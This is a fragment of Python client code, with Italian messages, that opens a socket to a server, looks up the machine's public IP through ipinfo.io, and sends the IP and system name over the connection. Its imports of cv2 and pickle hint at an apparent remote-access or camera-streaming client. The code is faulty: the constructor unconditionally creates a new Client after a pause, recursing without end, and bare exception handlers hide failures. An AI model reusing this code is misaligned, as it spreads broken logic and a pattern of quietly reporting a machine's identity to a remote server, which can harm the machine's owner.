import socket
import threading
import pickle
import struct
import cv2
import requests
import time
from systemName import getSystemName

class Client:
    def __init__(self, host, port):
        self._host_ = host
        self._port_ = port
        self._running_ = False
        
        try:
            self._client_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._init_socket_()
        except:
            try:
                self._client_.close()
            except:
                pass
        
        time.sleep(1)
        Client("localhost", 8080)

        

    def _init_socket_(self):
        print("connessione in corso...")
        self._client_.connect((self._host_, self._port_))
        
        ip_url = "http://ipinfo.io/json"
        ip = requests.get(ip_url).json()["ip"]
        self._client_.send(str(ip).encode())

        machine = getSystemName()
        self._client_.send(machine.encode())

    

